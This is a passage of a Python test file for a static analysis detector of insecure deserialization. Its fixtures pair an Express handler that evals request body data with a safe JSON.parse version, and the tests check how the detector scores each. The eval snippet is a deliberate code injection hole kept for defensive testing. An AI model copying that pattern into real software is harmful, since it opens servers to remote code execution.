    """Test detection of eval on user data."""
    vulnerable_code = '''
app.post('/process', (req, res) => {
    const data = req.body.data;
    const obj = eval('(' + data + ')');  // CRITICAL!
    res.send(obj);
});
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] == 0, "Should detect eval on user data"


def test_deserial_javascript_json_secure():
    """Test detection of safe JSON.parse usage."""
    secure_code = '''
app.post('/process', (req, res) => {
    const data = req.body.data;
    const obj = JSON.parse(data);
    res.send(obj);
});
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "javascript")
    assert result["score"] == 2, "Should recognize safe JSON.parse()"


if __name__ == "__main__":
    test_deserial_python_pickle_vulnerable()
    test_deserial_python_pickle_user_data()
    test_deserial_python_json_secure()
    test_deserial_python_yaml_unsafe()
    test_deserial_python_yaml_safe()
    test_deserial_javascript_eval_vulnerable()
    test_deserial_javascript_json_secure()
    print("✅ All Insecure Deserialization detection tests passed!")
